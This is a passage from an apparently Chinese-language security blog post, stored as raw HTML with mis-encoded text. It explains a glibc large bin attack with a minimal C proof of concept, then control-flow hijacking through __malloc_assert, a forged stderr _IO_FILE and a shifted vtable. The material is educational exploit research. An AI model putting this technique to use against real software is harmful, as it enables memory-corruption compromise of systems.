id="ç°ç»™å‡ºä¸€ä¸ªå®ç°è¯¥large-bin-attackçš„æœ€å°åˆ©ç”¨">â€ƒâ€ƒâ€ƒç°ç»™å‡ºä¸€ä¸ªå®ç°è¯¥large bin attackçš„æœ€å°åˆ©ç”¨</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
</span>
<span class="c1">/// @note å‡è®¾æˆ‘ä»¬éœ€è¦å°†ä¸€ä¸ªå †åœ°å€å†™åˆ°a[4]çš„ä½ç½®</span>

<span class="kt">size_t</span> <span class="n">a</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">size_t</span> <span class="o">*</span><span class="n">p1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x420</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">p2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x410</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x18</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p1</span><span class="p">);</span>

    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x440</span><span class="p">);</span> <span class="c1">// clear unsorted bins</span>

    <span class="n">p1</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span> <span class="c1">// largebin.bk_nextsize = target - 0x20</span>

    <span class="n">free</span><span class="p">(</span><span class="n">p2</span><span class="p">);</span>
    
    <span class="n">malloc</span><span class="p">(</span><span class="mh">0x440</span><span class="p">);</span> <span class="cm">/* clear unsorted bins
                    * and trigger the attack
                    */</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="p13--a0ä¹‹å-bk_nextsizeå˜æˆäº†a0çš„å½¢çŠ¶">â€ƒâ€ƒâ€ƒ<code class="language-plaintext highlighter-rouge">p1[3] = &amp;a[0]</code>ä¹‹å, <code class="language-plaintext highlighter-rouge">bk_nextsize</code>å˜æˆäº†<code class="language-plaintext highlighter-rouge">&amp;a[0]</code>çš„å½¢çŠ¶</h5> <p><img src="https://www.helloimg.com/i/2024/12/12/675aea0dc26bf.png" alt="Screenshot 2024-12-12 214851.png"></p> <h5 id="ç¬¬äºŒä¸ªmalloc0x440ä¹‹å-è§¦å‘äº†attack">â€ƒâ€ƒâ€ƒç¬¬äºŒä¸ª<code class="language-plaintext highlighter-rouge">malloc(0x440)</code>ä¹‹å, è§¦å‘äº†attack</h5> <p><img src="https://www.helloimg.com/i/2024/12/12/675aea0dcd486.png" alt="Screenshot 2024-12-12 214925.png"></p> <h5 id="æ£€æŸ¥a4-å‘ç°ç¡®å®ç¯¡æ”¹-å¹¶ä¸”å †åœ°å€æ˜¯">â€ƒâ€ƒâ€ƒæ£€æŸ¥<code class="language-plaintext highlighter-rouge">a[4]</code>, å‘ç°ç¡®å®ç¯¡æ”¹, å¹¶ä¸”å †åœ°å€æ˜¯</h5> <p><img src="https://www.helloimg.com/i/2024/12/12/675aea0dc1da0.png" alt="Screenshot 2024-12-12 215003.png"></p> <h5 id="å…·ä½“å‘ç”Ÿäº†ä»€ä¹ˆ-è¯·çœ‹png">â€ƒâ€ƒâ€ƒå…·ä½“å‘ç”Ÿäº†ä»€ä¹ˆ, è¯·çœ‹PNG</h5> <p><img src="https://www.helloimg.com/i/2024/12/12/675aef54cb20d.jpg" alt="æ‰«æå…¨èƒ½ç‹ 2024-12-12 22.11.jpg"></p> <h5 id="æ‰€ä»¥ä¸éš¾æ€»ç»“å‡ºéƒ¨ç½²ä¸€æ¬¡largebin-attackçš„æ–¹æ³•">â€ƒâ€ƒâ€ƒæ‰€ä»¥ä¸éš¾æ€»ç»“å‡ºéƒ¨ç½²ä¸€æ¬¡largebin attackçš„æ–¹æ³•:</h5> <h5 id="1å‡†å¤‡ä¸€ä¸ªchunk1-freeæ‰-å®ƒå°†ä½œä¸ºä¹‹åæºç ä¸­çš„fwd2ç”³è¯·ä¸€ä¸ªæ¯”chunk1å¤§çš„å †å—-chunk1å°±è¢«æ”¾åœ¨large-binä¸­3uafæˆ–è€…å †æº¢å‡º-ä¿®æ”¹chunk1çš„bk_nextsizeä¸ºä½ æŒ‡å®šçš„åœ°å€targetçš„ä½0x10-å³target---0x204ç”³è¯·ä¸€ä¸ªchunk2-å®ƒæ¯”chunk1å°-ä½†æ˜¯åº”è¯¥è¢«æ”¾åœ¨åŒä¸€ä¸ªbin-freeå®ƒ-ä½œä¸ºæºç ä¸­çš„victimå­˜åœ¨5é‡å¤2æ‰€åšçš„äº‹-è¿™ä¼šè§¦å‘largebin-attack-å¹¶åœ¨targetä½ç½®å†™ä¸Švictimçš„chunkheadçš„åœ°å€">â€ƒâ€ƒâ€ƒâ€ƒ1.å‡†å¤‡ä¸€ä¸ªchunk1, freeæ‰, å®ƒå°†ä½œä¸ºä¹‹åæºç ä¸­çš„<code class="language-plaintext highlighter-rouge">fwd</code><br>â€ƒâ€ƒâ€ƒâ€ƒ2.ç”³è¯·ä¸€ä¸ªæ¯”chunk1å¤§çš„å †å—, chunk1å°±è¢«æ”¾åœ¨large binä¸­<br>â€ƒâ€ƒâ€ƒâ€ƒ3.UAFæˆ–è€…å †æº¢å‡º, ä¿®æ”¹chunk1çš„<code class="language-plaintext highlighter-rouge">bk_nextsize</code>ä¸ºä½ æŒ‡å®šçš„åœ°å€targetçš„ä½0x10, å³<code class="language-plaintext highlighter-rouge">target - 0x20</code><br>â€ƒâ€ƒâ€ƒâ€ƒ4.ç”³è¯·ä¸€ä¸ªchunk2, å®ƒæ¯”chunk1å°, ä½†æ˜¯åº”è¯¥è¢«æ”¾åœ¨åŒä¸€ä¸ªbin, freeå®ƒ, ä½œä¸ºæºç ä¸­çš„<code class="language-plaintext highlighter-rouge">victim</code>å­˜åœ¨<br>â€ƒâ€ƒâ€ƒâ€ƒ5.é‡å¤2æ‰€åšçš„äº‹, è¿™ä¼šè§¦å‘largebin attack, å¹¶åœ¨<code class="language-plaintext highlighter-rouge">target</code>ä½ç½®å†™ä¸Š<code class="language-plaintext highlighter-rouge">victim</code>çš„chunkheadçš„åœ°å€</h5> <h3 id="__malloc_assertåŠ«æŒæ§åˆ¶æµ">__malloc_assertåŠ«æŒæ§åˆ¶æµ</h3> <h4 id="åŠ«æŒè·¯å¾„">â€ƒåŠ«æŒè·¯å¾„</h4> <h5 id="__malloc_assertæ˜¯ä¸€ä¸ªç”¨äºåˆ¤æ–­å †åˆ†é…è¯·æ±‚æ˜¯å¦åˆç†çš„å‡½æ•°-æœ‰è®¸å¤šæ–¹å¼æ¥è§¦å‘è¿™ä¸ªå‡½æ•°-é€‰å–å…¶ä¸­æœ€ç®€å•çš„æ–¹æ³•-ä½¿ç”¨æŸç§æ‰‹æ³•æ¥ä¿®æ”¹top-chunkçš„chunksizeä½-ä½¿å¾—å®ƒå°äºä¹‹åè¦ç”³è¯·çš„chunkçš„å¤§å°-æ³¨æ„è¿™é‡Œä¸house-of-orangeç›¸å-æˆ‘ä»¬éœ€è¦è®©ä¿®æ”¹åçš„-chunksize_nomasksize--chunk_headä¸ä¸å†…å­˜é¡µå¯¹é½-ä»è€Œè§¦å‘å¼‚å¸¸-__malloc_assertä¼šå°è¯•å°†é”™è¯¯ä¿¡æ¯è¾“å…¥åˆ°stderrè¿™ä¸ªè¾“å…¥çš„è¿‡ç¨‹çš„è°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹">â€ƒâ€ƒâ€ƒ<code class="language-plaintext highlighter-rouge">__malloc_assert</code>æ˜¯ä¸€ä¸ªç”¨äºåˆ¤æ–­å †åˆ†é…è¯·æ±‚æ˜¯å¦åˆç†çš„å‡½æ•°, æœ‰è®¸å¤šæ–¹å¼æ¥è§¦å‘è¿™ä¸ªå‡½æ•°; <br>â€ƒâ€ƒâ€ƒé€‰å–å…¶ä¸­æœ€ç®€å•çš„æ–¹æ³•, ä½¿ç”¨æŸç§æ‰‹æ³•æ¥ä¿®æ”¹top chunkçš„chunksizeä½, ä½¿å¾—å®ƒå°äºä¹‹åè¦ç”³è¯·çš„chunkçš„å¤§å°, æ³¨æ„è¿™é‡Œä¸house of orangeç›¸å, æˆ‘ä»¬éœ€è¦è®©ä¿®æ”¹åçš„ <code class="language-plaintext highlighter-rouge">chunksize_nomask(size) + &amp;chunk_head</code>ä¸ä¸å†…å­˜é¡µå¯¹é½, ä»è€Œè§¦å‘å¼‚å¸¸. <code class="language-plaintext highlighter-rouge">__malloc_assert</code>ä¼šå°è¯•å°†é”™è¯¯ä¿¡æ¯è¾“å…¥åˆ°<code class="language-plaintext highlighter-rouge">stderr</code><br>â€ƒâ€ƒâ€ƒè¿™ä¸ªè¾“å…¥çš„è¿‡ç¨‹çš„è°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">__malloc_assert</span><span class="p">()</span> <span class="o">--</span><span class="p">(</span><span class="n">assert</span> <span class="nb">false</span><span class="p">)</span><span class="o">--&gt;</span> <span class="n">__fxprintf</span> <span class="o">----&gt;</span> <span class="n">vfxprintf</span><span class="p">()</span> <span class="o">----&gt;</span> <span class="n">locked_vfxprintf</span><span class="p">()</span> <span class="o">----&gt;</span> <span class="n">__vfprintf_internal</span><span class="p">()</span> <span class="o">----&gt;</span> <span class="n">_IO_file_xsputn</span><span class="p">()</span>
</code></pre></div></div> <h5 id="ä¸€è·¯åˆ°æœ€å-å‡½æ•°å°è¯•è°ƒç”¨äº†_io_file_xputsn-è€Œè¿™ä¸ªå‡½æ•°æ­£å¥½æ˜¯é€šè¿‡_io_file_plusç»“æ„ä½“ä¸­çš„vtableåŠ ä¸Šåç§»è®¡ç®—çš„-è¿™å°±ç»™äº†æˆ‘ä»¬ç¯¡æ”¹çš„æœºä¼š">â€ƒâ€ƒâ€ƒä¸€è·¯åˆ°æœ€å, å‡½æ•°å°è¯•è°ƒç”¨äº†<code class="language-plaintext highlighter-rouge">_IO_file_xputsn()</code>, è€Œè¿™ä¸ªå‡½æ•°æ­£å¥½æ˜¯é€šè¿‡<code class="language-plaintext highlighter-rouge">_IO_file_plus</code>ç»“æ„ä½“ä¸­çš„vtableåŠ ä¸Šåç§»è®¡ç®—çš„, è¿™å°±ç»™äº†æˆ‘ä»¬ç¯¡æ”¹çš„æœºä¼š,</h5> <p><a href="https://www.helloimg.com/i/2024/12/13/675b91b714ab9.png" rel="external nofollow noopener" target="_blank"><img src="https://www.helloimg.com/i/2024/12/13/675b91b714ab9.png" alt="Screenshot 2024-12-13 094514.png"></a></p> <h5 id="ä¸‹é¢çš„_io_file_jumpså°±æ˜¯è¢«æŸ¥è¯¢çš„è™šè¡¨-å…³æ³¨åœ¨__xsputnä¸‹æ–¹0x10åç§»å¤„çš„__seekoff">â€ƒâ€ƒâ€ƒä¸‹é¢çš„<code class="language-plaintext highlighter-rouge">_IO_file_jumps</code>å°±æ˜¯è¢«æŸ¥è¯¢çš„è™šè¡¨, å…³æ³¨åœ¨<code class="language-plaintext highlighter-rouge">__xsputn</code>ä¸‹æ–¹0x10åç§»å¤„çš„<code class="language-plaintext highlighter-rouge">__seekoff</code><br> </h5> <h5 id="-ä¸‹é¢æ˜¯seekoffçš„æºç -çœå»ä¸é‡è¦çš„ä¿¡æ¯-å‘ç°åœ¨returnä¹‹å‰ä¼šè°ƒç”¨_io_switch_to_wget_modefp-è¿™é‡Œçš„fpæ¯«æ— ç–‘é—®åº”è¯¥æ˜¯stderr">â€ƒâ€ƒâ€ƒ ä¸‹é¢æ˜¯seekoffçš„æºç , çœå»ä¸é‡è¦çš„ä¿¡æ¯, å‘ç°åœ¨returnä¹‹å‰ä¼šè°ƒç”¨<code class="language-plaintext highlighter-rouge">_IO_switch_to_wget_mode(fp)</code>, è¿™é‡Œçš„<code class="language-plaintext highlighter-rouge">fp</code>æ¯«æ— ç–‘é—®åº”è¯¥æ˜¯<code class="language-plaintext highlighter-rouge">stderr</code> </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_IO_wfile_seekoff</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="n">off64_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dir</span><span class="p">,</span> <span class="kt">int</span> <span class="n">mode</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">off64_t</span> <span class="n">result</span><span class="p">;</span>
  <span class="n">off64_t</span> <span class="n">delta</span><span class="p">,</span> <span class="n">new_offset</span><span class="p">;</span>
  <span class="kt">long</span> <span class="kt">int</span> <span class="n">count</span><span class="p">;</span>

    <span class="c1">///@warning è¿™é‡Œçš„modeå’Œä¸‹é¢çš„must_be_exactéœ€è¦æƒ³åŠæ³•ç»•è¿‡</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">mode</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">do_ftell_wide</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>

  <span class="kt">int</span> <span class="n">must_be_exact</span> <span class="o">=</span> <span class="p">((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span>
            <span class="o">==</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
               <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span>
               <span class="o">==</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span><span class="p">));</span>

  <span class="n">bool</span> <span class="n">was_writing</span> <span class="o">=</span> <span class="p">((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span>
		       <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
		      <span class="o">||</span> <span class="n">_IO_in_put_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">));</span>


  <span class="k">if</span> <span class="p">(</span><span class="n">was_writing</span> <span class="o">&amp;&amp;</span> <span class="n">_IO_switch_to_wget_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">WEOF</span><span class="p">;</span>
<span class="p">......</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="_io_switch_to_wget_mode-åˆåˆ°äº†_io_woverflow">â€ƒâ€ƒâ€ƒ<code class="language-plaintext highlighter-rouge">_IO_switch_to_wget_mode</code>, åˆåˆ°äº†<code class="language-plaintext highlighter-rouge">_IO_WOVERFLOW()</code>,</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_IO_switch_to_wget_mode</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">)</span>
    <span class="k">if</span> <span class="p">((</span><span class="kt">wint_t</span><span class="p">)</span><span class="n">_IO_WOVERFLOW</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">WEOF</span><span class="p">)</span> <span class="o">==</span> <span class="n">WEOF</span><span class="p">)</span>
      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
    <span class="p">...</span>
    <span class="p">...</span>
    <span class="p">...</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="_io_woverflowçš„æ±‡ç¼–-æ³¨æ„-37-ä½ç½®çš„callæŒ‡ä»¤-åªè¦èƒ½å¤Ÿæ§åˆ¶rax-å°±å¯ä»¥åŠ«æŒæ§åˆ¶æµäº†finally">â€ƒâ€ƒâ€ƒ<code class="language-plaintext highlighter-rouge">_IO_WOVERFLOW()</code>çš„æ±‡ç¼–, æ³¨æ„ +37 ä½ç½®çš„callæŒ‡ä»¤, åªè¦èƒ½å¤Ÿæ§åˆ¶<code class="language-plaintext highlighter-rouge">rax</code>, å°±å¯ä»¥åŠ«æŒæ§åˆ¶æµäº†(finally!)</h5> <p><img src="https://www.helloimg.com/i/2024/12/13/675b9615d8209.png" alt="Screenshot 2024-12-13 100413.png"></p> <h5 id="ç°åœ¨éœ€è¦çŸ¥é“raxåœ¨callä¹‹å‰æ˜¯å¦‚ä½•èµ‹å€¼çš„-ç”±äºrdiå§‹ç»ˆæ²¡æœ‰å˜-æ‰€ä»¥ä»¥rdiä½œä¸ºåŸºå‡†-rdx--rdi--0xc0-rax--rdi--0xa0--0xe0-rsi--0xffffffff-æ ¹æ®blog-httpsxzaliyuncomt13016time__1311gqmhbkykgiqgx0hq1duwxgcwv2xtdpydtoc-5-è¿™é‡Œçš„rdiå®é™…ä¸Šæ˜¯ä¸€ä¸ªå †åœ°å€">â€ƒâ€ƒâ€ƒç°åœ¨éœ€è¦çŸ¥é“<code class="language-plaintext highlighter-rouge">rax</code>åœ¨callä¹‹å‰æ˜¯å¦‚ä½•èµ‹å€¼çš„, ç”±äºrdiå§‹ç»ˆæ²¡æœ‰å˜, æ‰€ä»¥ä»¥rdiä½œä¸ºåŸºå‡†, <code class="language-plaintext highlighter-rouge">rdx = rdi + 0xc0; rax = rdi + 0xa0 + 0xe0; rsi = 0xffffffff</code>, æ ¹æ®blog https://xz.aliyun.com/t/13016?time__1311=GqmhBKYKGIqGx0HQ1DuWxgCWv2xTDpYD#toc-5, è¿™é‡Œçš„rdiå®é™…ä¸Šæ˜¯ä¸€ä¸ªå †åœ°å€<br> </h5> <h5 id="æœ‰ä¸€ç‚¹ä¸ä¸€æ ·-å°±æ˜¯ä¸Šé¢blogä¸­çš„_io_woverflowçš„æºç æ²¡æœ‰mov-esi-0xffffffff-ç¬”è€…glibcç‰ˆæœ¬235-æ‰€ä»¥åœ¨æ­¤æƒ…å†µä¹‹ä¸‹-å®é™…ä¸Šåªèƒ½å‘callæŒ‡ä»¤çš„å‡½æ•°ä¼ ä¸€ä¸ªæœ‰æ•ˆçš„å‚æ•°rdi-å¯¹æ­¤-å¯ä»¥ä½¿ç”¨setcontextè¿™ä¸ªgadget-å› ä¸ºå®ƒä¸»è¦ä½¿ç”¨rdxå’Œåç§»æ¥è®¾ç½®å…¶ä»–å¯„å­˜å™¨-è€Œrdxæ˜¯å¯ä»¥è¢«æ§åˆ¶çš„">â€ƒâ€ƒâ€ƒæœ‰ä¸€ç‚¹ä¸ä¸€æ ·, å°±æ˜¯ä¸Šé¢blogä¸­çš„<code class="language-plaintext highlighter-rouge">_IO_WOVERFLOW()</code>çš„æºç æ²¡æœ‰<code class="language-plaintext highlighter-rouge">mov esi, 0xffffffff</code>, (ç¬”è€…glibcç‰ˆæœ¬2.35), æ‰€ä»¥åœ¨æ­¤æƒ…å†µä¹‹ä¸‹, å®é™…ä¸Šåªèƒ½å‘callæŒ‡ä»¤çš„å‡½æ•°ä¼ ä¸€ä¸ªæœ‰æ•ˆçš„å‚æ•°(rdi). å¯¹æ­¤, å¯ä»¥ä½¿ç”¨<code class="language-plaintext highlighter-rouge">setcontext</code>è¿™ä¸ªgadget, å› ä¸ºå®ƒä¸»è¦ä½¿ç”¨rdxå’Œåç§»æ¥è®¾ç½®å…¶ä»–å¯„å­˜å™¨, è€Œrdxæ˜¯å¯ä»¥è¢«æ§åˆ¶çš„<br> </h5> <h5 id="æ€»è€Œè¨€ä¹‹-éœ€è¦å°†åŸæœ¬çš„stderrçš„åœ°å€ä¿®æ”¹ä¸ºå¯æ§çš„ä¸€å¤§å—æ•°æ®é€šè¿‡largebin-attack-ç„¶åå°†å…¶ä¸­çš„_io_file_jumpsè™šè¡¨-æ”¹ä¸ºè¯¥è™šè¡¨--0x10-çš„å€¼-ç„¶åè§¦å‘__malloc_assert">â€ƒâ€ƒâ€ƒæ€»è€Œè¨€ä¹‹, éœ€è¦å°†åŸæœ¬çš„stderrçš„åœ°å€ä¿®æ”¹ä¸ºå¯æ§çš„ä¸€å¤§å—æ•°æ®(é€šè¿‡largebin attack), ç„¶åå°†å…¶ä¸­çš„<code class="language-plaintext highlighter-rouge">_IO_file_jumps</code>è™šè¡¨, æ”¹ä¸º<code class="language-plaintext highlighter-rouge">è¯¥è™šè¡¨ + 0x10 çš„å€¼</code>, ç„¶åè§¦å‘<code class="language-plaintext highlighter-rouge">__malloc_assert</code> </h5> <h4 id="-ä¼ªé€ _io_fileç»“æ„ä½“">â€ƒ ä¼ªé€ _IO_FILEç»“æ„ä½“</h4> <h5 id="ä»ä¸Šé¢çš„åˆ†ææ¥çœ‹-å®ŒæˆåŠ«æŒéœ€è¦åˆ¶é€ é”™è¯¯çš„vtableåç§»-éœ€è¦ç»•è¿‡mode-must_be_exact-was_writingçš„æ£€æŸ¥-è¿™äº›å†…å®¹å¯ä»¥é€šè¿‡é€šè¿‡ä¼ªé€ ä¸€ä¸ªå‡çš„_io_file_completeç»“æ„ä½“-åœ¨æŠŠåŸæœ¬çš„stderrç”¨è¿™ä¸ªå‡çš„æ›¿æ¢-å³å¯æ»¡è¶³æ‰€ä»¥è¿™é‡Œæœ‰å¿…è¦äº†è§£ä¸€ä¸‹_io_fileç­‰ç»“æ„ä½“çš„ç»“æ„">â€ƒâ€ƒâ€ƒä»ä¸Šé¢çš„åˆ†ææ¥çœ‹, å®ŒæˆåŠ«æŒéœ€è¦åˆ¶é€ é”™è¯¯çš„vtableåç§», éœ€è¦ç»•è¿‡mode, must_be_exact, was_writingçš„æ£€æŸ¥, è¿™äº›å†…å®¹å¯ä»¥é€šè¿‡é€šè¿‡ä¼ªé€ ä¸€ä¸ªå‡çš„_IO_FILE_completeç»“æ„ä½“, åœ¨æŠŠåŸæœ¬çš„stderrç”¨è¿™ä¸ªå‡çš„æ›¿æ¢, å³å¯æ»¡è¶³<br>â€ƒâ€ƒâ€ƒæ‰€ä»¥è¿™é‡Œæœ‰å¿…è¦äº†è§£ä¸€ä¸‹_IO_FILEç­‰ç»“æ„ä½“çš„ç»“æ„<br> </h5> <h5 id="é¦–å…ˆæ˜¯_io_fileç»“æ„ä½“-å†…å®¹æ¯”è¾ƒå¤š-ä½†ä¸»è¦å…³æ³¨äºå‰é¢8ä¸ªæŒ‡é’ˆ-å®ƒä»¬å’Œç»•è¿‡æ£€æŸ¥æœ‰å…³ä¸­é—´çš„_io_backup_base-ä¼¼ä¹ä¸€äº›æ‰‹æ³•å¯èƒ½ä¼šç”¨å¾—åˆ°-ä½†ä¸æ˜¯è¿™é‡Œç„¶åæ˜¯chainç»“æ„ä½“-ç”¨æ¥è¿æ¥å…¶ä»–çš„ç»“æ„ä½“-æ¯”å¦‚stderrä¼šè¿æ¥stdoutä¸Šæ–‡çš„å›¾ä¸­">â€ƒâ€ƒâ€ƒé¦–å…ˆæ˜¯_IO_FILEç»“æ„ä½“, å†…å®¹æ¯”è¾ƒå¤š, ä½†ä¸»è¦å…³æ³¨äºå‰é¢8ä¸ªæŒ‡é’ˆ, å®ƒä»¬å’Œç»•è¿‡æ£€æŸ¥æœ‰å…³<br>â€ƒâ€ƒâ€ƒä¸­é—´çš„<code class="language-plaintext highlighter-rouge">_IO_backup_base</code>, ä¼¼ä¹ä¸€äº›æ‰‹æ³•å¯èƒ½ä¼šç”¨å¾—åˆ°, ä½†ä¸æ˜¯è¿™é‡Œ<br>â€ƒâ€ƒâ€ƒç„¶åæ˜¯<code class="language-plaintext highlighter-rouge">chain</code>ç»“æ„ä½“, ç”¨æ¥è¿æ¥å…¶ä»–çš„ç»“æ„ä½“, æ¯”å¦‚stderrä¼šè¿æ¥stdout(ä¸Šæ–‡çš„å›¾ä¸­)</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_FILE</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>		<span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>

  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_ptr</span><span class="p">;</span>	<span class="cm">/* Current read pointer */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_end</span><span class="p">;</span>	<span class="cm">/* End of get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_read_base</span><span class="p">;</span>	<span class="cm">/* Start of putback+get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_base</span><span class="p">;</span>	<span class="cm">/* Start of put area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_ptr</span><span class="p">;</span>	<span class="cm">/* Current put pointer. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_write_end</span><span class="p">;</span>	<span class="cm">/* End of put area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_base</span><span class="p">;</span>	<span class="cm">/* Start of reserve area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_buf_end</span><span class="p">;</span>	<span class="cm">/* End of reserve area. */</span>

  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>

  <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>

  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>

  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
  <span class="n">__off_t</span> <span class="n">_old_offset</span><span class="p">;</span> <span class="cm">/* This used to be _offset but it's too small.  */</span>

  <span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span>
  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

  <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
<span class="cp">#ifdef _IO_USE_OLD_IO_FILE
</span><span class="p">};</span>
</code></pre></div></div> <h5 id="ç„¶åæ˜¯_io_file_completeç»“æ„ä½“-æ˜¯_io_fileçš„åŠ é•¿ç‰ˆ-å…³æ³¨_wide_dataæŒ‡é’ˆ-å’Œç»•è¿‡æ£€æŸ¥æœ‰å…³ç³»">â€ƒâ€ƒâ€ƒç„¶åæ˜¯<code class="language-plaintext highlighter-rouge">_IO_FILE_complete</code>ç»“æ„ä½“, æ˜¯<code class="language-plaintext highlighter-rouge">_IO_FILE</code>çš„åŠ é•¿ç‰ˆ, å…³æ³¨<code class="language-plaintext highlighter-rouge">_wide_data</code>æŒ‡é’ˆ, å’Œç»•è¿‡æ£€æŸ¥æœ‰å…³ç³»</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_FILE_complete</span>
<span class="p">{</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="n">_file</span><span class="p">;</span>
<span class="cp">#endif
</span>  <span class="n">__off64_t</span> <span class="n">_offset</span><span class="p">;</span>
  <span class="cm">/* Wide character stream stuff.  */</span>
  <span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="o">*</span><span class="n">_codecvt</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_wide_data</span> <span class="o">*</span><span class="n">_wide_data</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_freeres_list</span><span class="p">;</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">_freeres_buf</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">__pad5</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">_mode</span><span class="p">;</span>
  <span class="cm">/* Make sure we don't get into trouble again.  */</span>
